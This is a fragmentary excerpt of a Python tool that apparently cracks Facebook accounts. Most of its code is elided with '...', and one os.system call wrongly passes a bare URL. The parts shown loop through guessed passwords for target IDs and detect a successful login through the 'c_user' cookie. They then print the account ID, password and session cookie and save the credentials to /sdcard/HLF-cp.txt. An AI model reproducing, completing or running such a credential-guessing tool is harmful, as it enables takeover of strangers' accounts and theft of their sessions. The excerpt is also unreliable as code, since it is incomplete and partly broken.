...
os.system('xdg-open https://github.com/MohammedFarouq')
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('https://www.facebook.com/profile.php?id=100000280956680/')
...
def gml():
    ...
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000, 10000000 ')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[HLF-OK] {uid} | {ps}")

                print(f" Cookie : {coki}")

                open('/sdcard/HLF-cp.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\x1b[38;5;196m[HLF-CP] {cid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[HLF] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
